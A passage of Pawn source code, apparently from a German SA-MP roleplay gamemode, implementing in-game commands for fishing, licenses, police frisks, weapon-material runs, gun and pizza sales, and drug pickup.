			else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Fisch Nummer 2 gefangen !"); return 1; }
			else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Fisch Nummer 3 gefangen !"); return 1; }
			else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Fisch Nummer 4 gefangen !"); return 1; }
			else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Fisch Nummer 5 gefangen !"); return 1; }
			ClearFishID(playerid, fishid);
			Fishes[playerid][pLastFish] = 0;
   			Fishes[playerid][pFishID] = 0;
			new stringd[128];
	        format(stringd, sizeof(stringd), "Du hast den Fisch %d Zurückgeworfen!",fishid);
			SendClientMessage(playerid, COLOR_GREY, stringd);
		}
		return 1;
	}
 	if(strcmp(cmd,"/throwback",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(Fishes[playerid][pLastFish] > 0)
	        {
	            ClearFishID(playerid, Fishes[playerid][pLastFish]);
	            Fishes[playerid][pLastFish] = 0;
	            Fishes[playerid][pFishID] = 0;
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keinen Fisch gefangen !");
	            return 1;
	        }
	    }
	    return 1;
 	}
 	if(strcmp(cmd,"/throwbackall",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(Fishes[playerid][pWeight1] > 0 || Fishes[playerid][pWeight2] > 0 || Fishes[playerid][pWeight3] > 0 || Fishes[playerid][pWeight4] > 0 || Fishes[playerid][pWeight5] > 0)
	        {
	            ClearFishes(playerid);
				Fishes[playerid][pLastFish] = 0;
				Fishes[playerid][pFishID] = 0;
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keinen Fisch gefangen !");
	            return 1;
	        }
	    }
	    return 1;
 	}
	if(strcmp(cmd,"/licensepreise",true) == 0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(IsPlayerInFrac(playerid,11) || PlayerInfo[playerid][pAdmin] >= 1)
	        {
		        tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /licensepreise [Spieler ID / Name]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if(ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
						    format(string, sizeof(string), "* %s zeigt %s die Lizens-Preise.",sendername,giveplayer);
						    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						    SendClientMessage(giveplayerid,COLOR_GRAD1," Führerschein: 3.000$ [Level 1]");
						    SendClientMessage(giveplayerid,COLOR_GRAD1," Angelschein: 1.000$ [Level 1]");
						    SendClientMessage(giveplayerid,COLOR_GRAD1," Segelschein: 24.000$ [Level 1]");
						    SendClientMessage(giveplayerid,COLOR_GRAD1," Flugschein: 56.000$ [Level 3]");
						    SendClientMessage(giveplayerid,COLOR_GRAD1," Waffenschein: 120.000$ [Level 5, Staatsfraktionen 100.000$]");
							SendClientMessage(giveplayerid,COLOR_GRAD1," LKW-Schein: 13.500$ [Level 1]");
							SendClientMessage(giveplayerid,COLOR_GRAD1," Motorradschein: 6.800$ [Level 1]");
							SendClientMessage(giveplayerid,COLOR_GRAD1," Rollerschein: 1.000$ [Level 1]");
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
						    return 1;
						}
					}
				}
		        else
		        {
		            SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
		            return 1;
		        }
	        }
		}
	    return 1;
 	}
	if(strcmp(cmd,"/licenses",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        new text1[20];
	        new text3[20];
	        new text4[20];
	        new text5[20];
	        new text6[20];
	        new text7[20];
	        new text8[20];
	        new text9[20];
	        if(PlayerInfo[playerid][pCarLic]) { text1 = "bestanden"; } else { text1 = "nicht bestanden"; }
            if(PlayerInfo[playerid][pFlyLic]) { text3 = "bestanden"; } else { text3 = "nicht bestanden"; }
			if(PlayerInfo[playerid][pBoatLic]) { text4 = "bestanden"; } else { text4 = "nicht bestanden"; }
	        if(PlayerInfo[playerid][pFishLic]) { text5 = "bestanden"; } else { text5 = "nicht bestanden"; }
	        if(PlayerInfo[playerid][pGunLic]) { text6 = "bestanden"; } else { text6 = "nicht bestanden"; }
	        if(PlayerInfo[playerid][pMotoLic]) { text7 = "bestanden"; } else { text7 = "nicht bestanden"; }
	        if(PlayerInfo[playerid][pLKWLic]) { text8 = "bestanden"; } else { text8 = "nicht bestanden"; }
	        if(PlayerInfo[playerid][pRollerLic]) { text9 = "bestanden"; } else { text9 = "nicht bestanden"; }
	        SendClientMessage(playerid, COLOR_WHITE, "|__________________ Lizenzen __________________|");
        	format(string, sizeof(string), "** Führerschein: %s (Strafpunkte: %d/12)",text1, PlayerInfo[playerid][pCarP]);
			SendClientMessage(playerid, COLOR_GREY, string);
   			if(PlayerInfo[playerid][pMotoLic])
			format(string, sizeof(string), "** Fluglizenz: %s.", text3);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Segelschein: %s.", text4);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Angelschein: %s.", text5);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Waffenschein: %s.", text6);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** LKW Schein: %s.", text8);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Rollerschein: %s.", text9);
			SendClientMessage(playerid, COLOR_GREY, string);
			SendClientMessage(playerid, COLOR_WHITE, "|______________________________________________|");
		}
	    return 1;
 	}
   	if(strcmp(cmd,"/showmarke",true)==0)
	{
        if(IsPlayerConnected(playerid))
        {
            if(!IsACop(playerid)) return 1;
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SCM(playerid, COLOR_RED, "Verwendung /showmarke [SpielerID/GetName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        ShowMarke(playerid, giveplayerid);
                        return 1;
                    }
                    else
                    {
                        SCM(playerid, COLOR_GREY, "   Spieler ist nicht in deiner Nähe !");
                        return 1;
                    }
                }
            }
            else
            {
                SCM(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
                return 1;
            }
        }
        return 1;
    }
 	if(strcmp(cmd,"/scheine",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /scheine [playerid/Name]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
				    if (ProxDetectorS(8.0, playerid, giveplayerid))
					{
					    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dir deine Lizenzen nicht selber zeigen, gib /licenses ein für Hilfe!"); return 1; }
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
					    new text1[20];
				        new text3[20];
				        new text4[20];
				        new text5[20];
				        new text6[20];
				        new text9[20];
				        new text10[20];
				        new text12[20];
						if(PlayerInfo[playerid][pCarLic]) { text1 = "Bestanden"; } else { text1 = "Nicht bestanden"; }
						if(PlayerInfo[playerid][pFlyLic]) { text3 = "Bestanden"; } else { text3 = "Nicht bestanden"; }
						if(PlayerInfo[playerid][pBoatLic]) { text4 = "Bestanden"; } else { text4 = "Nicht bestanden"; }
				        if(PlayerInfo[playerid][pFishLic]) { text5 = "Bestanden"; } else { text5 = "Nicht bestanden"; }
				        if(PlayerInfo[playerid][pLKWLic]) { text9 = "Bestanden"; } else { text9 = "Nicht bestanden"; }
				        if(PlayerInfo[playerid][pMotoLic]) { text10 = "Bestanden"; } else { text10 = "Nicht bestanden"; }
				        if(PlayerInfo[playerid][pGunLic]) { text6 = "Bestanden"; } else { text6 = "Nicht bestanden"; }
				        if(PlayerInfo[playerid][pRollerLic]) { text12 = "bestanden"; } else { text12 = "Nicht bestanden"; }
				        format(string, sizeof(string), "|__________ Lizenzen von %s __________|", sendername);
			        	format(string, sizeof(string), "** Führerschein: %s (Strafpunkte: %d/12)",text1, PlayerInfo[playerid][pCarP]);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "** Fluglizenz: %s.", text3);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "** Segelschein: %s.", text4);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "** Angelschein: %s.", text5);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
    					format(string, sizeof(string), "** Waffenschein: %s.", text6);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "** LKW Schein: %s.", text9);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "** Rollerschein: %s.", text12);
						SendClientMessage(giveplayerid, COLOR_GREY, string);
						format(string, sizeof(string), "* %s hat dir seine Lizenzen gezeigt.", sendername);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Du hast deine Lizenzen %s gezeigt.", giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
					    return 1;
					}
				}
			}
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
	            return 1;
	        }
		}
	    return 1;
 	}
	if(strcmp(cmd,"/frisk",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /frisk [playerid/PartOfName]");
				return 1;
			}
			if(!IsACop(playerid))
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keine anderen Leute durchsuchen!");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
				    if (ProxDetectorS(8.0, playerid, giveplayerid))
					{
					    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber durchsuchen/You can not search yourself yourself!"); return 1; }
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
					    new text1[20], text2[20], text3[20], text4[20], text5[20], text6[30], text7[20];
					    if(PlayerInfo[giveplayerid][pDrugs] > 0) { text1 = "| Drogen."; } else { text1 = "| -"; }
					    if(PlayerInfo[giveplayerid][pMats] > 0) { text2 = "| Materialien."; } else { text2 = "| -"; }
					    if(Fishes[giveplayerid][pWeight1] > 0 || Fishes[giveplayerid][pWeight2] > 0 || Fishes[giveplayerid][pWeight3] > 0 || Fishes[giveplayerid][pWeight4] > 0 || Fishes[giveplayerid][pWeight5] > 0) { text3 = "| Fisch."; } else { text3 = "| -."; }
					    if(PlayerInfo[giveplayerid][pPhoneBook] > 0) { text4 = "| Telefonbuch."; } else { text4 = "| -"; }
					    if(PlayerInfo[giveplayerid][pCDPlayer] > 0) { text5 = "| CD-Player."; } else { text5 = "| -"; }
					    if(PlayerInfo[giveplayerid][pInvMats] > 0) { text6 = "| Taschen-Materialien."; } else { text6 = "| -"; }
					    if(PlayerInfo[giveplayerid][pInvDrugs] > 0) { text7 = "| Tasche-Drogen."; } else { text7 = "| -"; }
					    format(string, sizeof(string), "|__________ Gegenstände von %s __________|", giveplayer);
				        SendClientMessage(playerid, COLOR_WHITE, string);
				        format(string, sizeof(string), "%s.", text1);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text2);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text3);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text4);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text5);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text6);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "%s.", text7);
						SendClientMessage(playerid, COLOR_GREY, string);
						format(string, sizeof(string), "* %s hat %s nach illegalen Gegenständen durchsucht.", sendername ,giveplayer);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner Nähe!");
					    return 1;
					}
				}
			}
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
	            return 1;
	        }
		}
	    return 1;
 	}
	if(strcmp(cmd,"/materials",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
		    if (PlayerInfo[playerid][pJob] != 9)
			{
			    SendClientMessage(playerid,COLOR_GREY,"Du bist kein Waffenhändler !");
			    return 1;
			}
			new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr)) {
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /materials [name]");
				SendClientMessage(playerid, COLOR_WHITE, "Befehle: Get, Deliver.");
				return 1;
			}
			if(strcmp(x_nr,"get",true) == 0)
			{
			    if(IsPlayerInRangeOfPoint(playerid,3.0,593.0110,-1248.0918,18.1534))
			    {
			        if(MatsHolding[playerid] >= 15)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Kein Platz mehr für mehr Material Pakete! !");
				        return 1;
			        }
			        tmp = strtoknew(cmdtext, idx);
			        if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /materials get [Betrag]");
						return 1;
					}
					moneys = strval(tmp);
					if(moneys < 1 || moneys > 15) { SendClientMessage(playerid, COLOR_GREY, "Du kannst maximal 10 Pakete mitnehmen !"); return 1; }
					new price = moneys * 100;
					if(GetPlayerMoneySave(playerid) > price)
					{
					    format(string, sizeof(string), "* Du hast %d Materials Pakete für $%d gekauft.", moneys, price);
					    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bringe sie zur Materials-Fabrik in San Fierro lass dich nicht Erwischen!");
					    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Der Punkt wurde auf der Map markiert, löschen mit /dc.");
						SetPlayerCheckpoint(playerid, -2109.4690,0.5970,35.3203, 3.0);
						GivePlayerMoneySave(playerid, - price);
					    MatsHolding[playerid] = moneys;
					}
					else
					{
					    format(string, sizeof(string), "   Du hast keine $%d !", price);
					    SendClientMessage(playerid, COLOR_GREY, string);
					}
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "An dieser Stelle kannst du keine Material-Pakete kaufen!");
			        return 1;
			    }
			}
			else if(strcmp(x_nr,"deliver",true) == 0)
			{
			    if(IsPlayerInRangeOfPoint(playerid,3.0,-2109.4983,0.7033,35.3203))
			    {
			        if(MatsHolding[playerid] > 0)
			        {
			            new payout = (50)*(MatsHolding[playerid]);
			            if(payout + PlayerInfo[playerid][pMats] > 2000)
			            {
			                SendClientMessage(playerid, COLOR_GRAD1, "Du kannst maximal 2000 Materialien tragen.");
			                return 1;
						}
			            format(string, sizeof(string), "* Die Fabrik hat dir %d Materialien für %d Pakete gegeben.", payout, MatsHolding[playerid]);
					    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			            PlayerInfo[playerid][pMats] += payout;
			            MatsHolding[playerid] = 0;
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Du haste keine Pakete !");
				        return 1;
			        }
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "Du bist nicht an der Waffenfabrik in San Fierro nähe der Docks !");
			        return 1;
			    }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Unbekannter Material-Name !");
			    return 1;
			}
		}
		return 1;
	}
    if(strcmp(cmd,"/sellgun",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
//		    if (PlayerInfo[playerid][pJob] != 9)
//			{
//			    SendClientMessage(playerid,COLOR_GREY,"Du bist kein Waffendealer!");
//			    return 1;
//			}
			new x_weapon[256],weapon[MAX_PLAYERS],ammo[MAX_PLAYERS],price[MAX_PLAYERS];
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "*** Waffen  ***");
				SendClientMessage(playerid, COLOR_GREY, "Benutze: /sellgun [playerid/PartOfName] [weaponname]");
				SendClientMessage(playerid, COLOR_GREY, "Waffen: Blumen(25) sPistole(100) Deagle(200) MP5(200) Schrotflinte(200)");
				SendClientMessage(playerid, COLOR_GREY, "Waffen: AK47(600) M4(600) Rifle(600)");
				SendClientMessage(playerid, COLOR_GREY, "*Angaben in den Klammern sind die erforderlichen Mats.");
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					x_weapon = strtoknew(cmdtext, idx);
					if(!strlen(x_weapon))
					{
						SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
						SendClientMessage(playerid, COLOR_WHITE, "*** Waffen  ***");
						SendClientMessage(playerid, COLOR_GREY, "Benutze: /sellgun [playerid/PartOfName] [weaponname]");
						SendClientMessage(playerid, COLOR_GREY, "Waffen: Blumen(25) sPistole(100) Deagle(200) MP5(200) Schrotflinte(200)");
						SendClientMessage(playerid, COLOR_GREY, "Waffen: AK47(600) M4(600) Rifle(600)");
						SendClientMessage(playerid, COLOR_GREY, "*Angaben in den Klammern sind die erforderlichen Mats.");
						SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
						return 1;
					}
				}
				if(strcmp(x_weapon,"sPistole",true) == 0) { if(PlayerInfo[playerid][pMats] > 99) { weapon[playerid] = 23; price[playerid] = 100; ammo[playerid] = 50; PlayerInfo[giveplayerid][pGun2] = 23; PlayerInfo[giveplayerid][pAmmo2] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die schallgedämpfte Pistole!"); return 1; } }
				else if(strcmp(x_weapon,"Blumen",true) == 0) { if(PlayerInfo[playerid][pMats] > 24) { weapon[playerid] = 14; price[playerid] = 25; ammo[playerid] = 1; PlayerInfo[giveplayerid][pGun1] = 14; PlayerInfo[giveplayerid][pAmmo1] = 1; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die Blumen!"); return 1; } }
				else if(strcmp(x_weapon,"Deagle",true) == 0) { if(PlayerInfo[playerid][pMats] > 199) { weapon[playerid] = 24; price[playerid] = 150; ammo[playerid] = 50; PlayerInfo[giveplayerid][pGun2] = 24; PlayerInfo[giveplayerid][pAmmo2] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die Deagle!"); return 1; } }
				else if(strcmp(x_weapon,"MP5",true) == 0) {	if(PlayerInfo[playerid][pMats] > 199) { weapon[playerid] = 29; price[playerid] = 200; ammo[playerid] = 200; PlayerInfo[giveplayerid][pGun2] = 29; PlayerInfo[giveplayerid][pAmmo2] = 200; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die MP5!"); return 1; } }
				else if(strcmp(x_weapon,"Schrotflinte",true) == 0) { if(PlayerInfo[playerid][pMats] > 199) { weapon[playerid] = 25; price[playerid] = 200; ammo[playerid] = 50; PlayerInfo[giveplayerid][pGun2] = 25; PlayerInfo[giveplayerid][pAmmo2] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die Schrotflinte!"); return 1; } }
				else if(strcmp(x_weapon,"AK47",true) == 0) { if(PlayerInfo[playerid][pMats] > 599) { weapon[playerid] = 30; price[playerid] = 600; ammo[playerid] = 250; PlayerInfo[giveplayerid][pGun2] = 30; PlayerInfo[giveplayerid][pAmmo2] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die AK47!"); return 1; } }
				else if(strcmp(x_weapon,"M4",true) == 0) { if(PlayerInfo[playerid][pMats] > 599) { weapon[playerid] = 31; price[playerid] = 600; ammo[playerid] = 250; PlayerInfo[giveplayerid][pGun2] = 31; PlayerInfo[giveplayerid][pAmmo2] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die M4!"); return 1; } }
				else if(strcmp(x_weapon,"Rifle",true) == 0) { if(PlayerInfo[playerid][pMats] > 599) { weapon[playerid] = 33; price[playerid] = 600; ammo[playerid] = 50; PlayerInfo[giveplayerid][pGun2] = 33; PlayerInfo[giveplayerid][pAmmo2] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"Du hast nicht genügend Mats für die Rifle!"); return 1; } }
				else { SendClientMessage(playerid,COLOR_GREY,"   Falscher Waffenname!"); return 1; }
				if (ProxDetectorS(5.0, playerid, giveplayerid))
				{
					if(PlayerInfo[playerid][pMiserPerk] > 0)
					{
					    new skill = 2 * PlayerInfo[playerid][pMiserPerk];
					    new mats = price[playerid] / 100;
					    price[playerid] -= (mats)*(skill);
					}
					ConsumingMoney[playerid] = 1;
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(IsPlayerInAnyVehicle(giveplayerid))
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keinem im Auto eine Waffe übergeben!");
					    return 1;
					}
					if(giveplayerid == playerid)
					{
						format(string, sizeof(string), " Du hast dir, eine %s mit %d Munition, für %d verkauft.", x_weapon, ammo[playerid], price[playerid]);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						format(string, sizeof(string), "* %s gibt sich eine Waffe.", sendername);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						ServerWeapon(playerid,weapon[playerid],ammo[playerid]);
						PlayerInfo[playerid][pMats] -= price[playerid];
					}
					else
					{
						format(string, sizeof(string), "   Du hast %s, eine %s mit %d Munition, für %d verkauft.", giveplayer,x_weapon, ammo[playerid], price[playerid]);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_GRAD1, string);
						format(string, sizeof(string), "   Du hast eine %s mit %d Munition von %s erhalten.", x_weapon, ammo[playerid], sendername);
						SendClientMessage(giveplayerid, COLOR_GRAD1, string);
						PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
						format(string, sizeof(string), "* %s übergibt an %s eine Waffe.", sendername ,giveplayer);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						ServerWeapon(giveplayerid,weapon[playerid],ammo[playerid]);
						PlayerInfo[playerid][pMats] -= price[playerid];
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Der Spieler ist zu weit weg!");
					return 1;
				}
			}
			else
			{
				format(string, sizeof(string), "%d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/sellpizza",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
		    if (PlayerInfo[playerid][pJob] != 19)
			{
			    SendClientMessage(playerid,COLOR_GREY,"   Du bist kein Pizza Dienst!");
			    return 1;
			}
			new pizzaname[256];
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "*** Pizza  ***");
				SendClientMessage(playerid, COLOR_GREY, "Benutze: /sellpizza [Playerid] [Pizzaname]");
				SendClientMessage(playerid, COLOR_GREY, "Pizzen: Salami Funghi Calzone");
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					pizzaname = strtoknew(cmdtext, idx);
					if(!strlen(pizzaname))
					{
						SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
						SendClientMessage(playerid, COLOR_WHITE, "*** Pizza  ***");
						SendClientMessage(playerid, COLOR_GREY, "Benutze: /sellpizza [Playerid] [Pizzaname]");
						SendClientMessage(playerid, COLOR_GREY, "Pizzen: Salami Funghi Calzone");
						SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
						return 1;
					}
				}
				if(strcmp(pizzaname,"Salami",true) == 0){ }
				else if(strcmp(pizzaname,"Funghi",true) == 0) { }
				else if(strcmp(pizzaname,"Calzone",true) == 0) { }
				else { SendClientMessage(playerid,COLOR_GREY,"   Falscher Pizza name!"); return 1; }
				if(ProxDetectorS(5.0, playerid, giveplayerid))
				{
				    if(giveplayerid == playerid)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "   Du kannst dir nicht selber Pizzen Verkaufen!");
						return 1;
					}
					ConsumingMoney[playerid] = 1;
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "   Du hast %s, eine Pizza %s verkauft.", giveplayer,pizzaname);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_GRAD1, string);
					format(string, sizeof(string), "   Du hast eine Pizza %s von %s gekauft.", pizzaname, sendername);
					SendClientMessage(giveplayerid, COLOR_GRAD1, string);
					PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "* %s verkauft an %s eine Pizza.", sendername ,giveplayer);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "   Der Spieler ist zu weit weg!");
					return 1;
				}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/drogenlager", true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, -85.4636,2.1646,3.1172))
	    {
	 	   	format(ALLSTRING, sizeof(ALLSTRING), "*Es sind %d Gramm Drogen im Drogenlager.", FarmerDrogen);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, ALLSTRING);
		}
		return 1;
	}
	if(strcmp(cmd,"/get",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);

			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_WHITE, "|__________________ Get __________________|");
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /get [name]");
		  		SendClientMessage(playerid, COLOR_GREY, "Befehle: Drugs, Fuel, Anwaltlicense");
				SendClientMessage(playerid, COLOR_GREEN, "|_________________________________________|");
				return 1;
			}

		    if(strcmp(x_job,"drugs",true) == 0)
			{
		        new tel;
			    new price;
			    new ammount;
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /get drugs [Betrag]");
					return 1;
				}
				new level = PlayerInfo[playerid][pDrugsSkill];
				ammount = strval(tmp);
				if(level >= 0 && level <= 50)
				{ tel = 1000; if(ammount < 1 || ammount > 6) { SendClientMessage(playerid, COLOR_GREY, "   Mit deinem Skill kannst du Maximal 6 gramm Drogen tragen!!"); return 1; } }
				else if(level >= 51 && level <= 100)
				{ tel = 900; if(ammount < 1 || ammount > 12) { SendClientMessage(playerid, COLOR_GREY, "   Mit deinem Skill kannst du Maxima 12 gramm Drogen tragen!!"); return 1; } }
				else if(level >= 101 && level <= 200)
				{ tel = 850; if(ammount < 1 || ammount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Mit deinem Skill kannst du Maximal 20 gramm Drogen tragen!"); return 1; } }
				else if(level >= 201 && level <= 400)
				{ tel = 825; if(ammount < 1 || ammount > 30) { SendClientMessage(playerid, COLOR_GREY, "   Mit deinem Skill kannst du Maximal 30 gramm Drogen tragen!"); return 1; } }
				else if(level >= 401)
				{ tel = 800; if(ammount < 1 || ammount > 99) { SendClientMessage(playerid, COLOR_GREY, "   Mit deinem Skill kannst du Maximal 99 gramm Drogen tragen!"); return 1; } }
				if(FarmerDrogen - ammount < 0)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht vorhanden!");
